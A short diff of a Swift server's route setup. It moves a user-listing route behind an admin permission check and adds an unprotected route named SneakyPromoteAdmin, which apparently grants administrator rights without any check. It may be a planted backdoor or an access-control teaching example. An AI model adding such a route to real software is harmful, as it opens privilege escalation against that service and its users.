@@ -6,10 +6,11 @@ try app.databases.use(.mongo(connectionString: "mongodb://localhost/decl"), as: 
 
 app.buildRoutes {
     CreateUser()
-    ListAll<User>()
+    GetProfile()
+    SneakyPromoteAdmin()
     
     Grouped(PermissionsCheck(type: .admin)) {
-        GetProfile()
+        ListAll<User>()
     }
 }
 
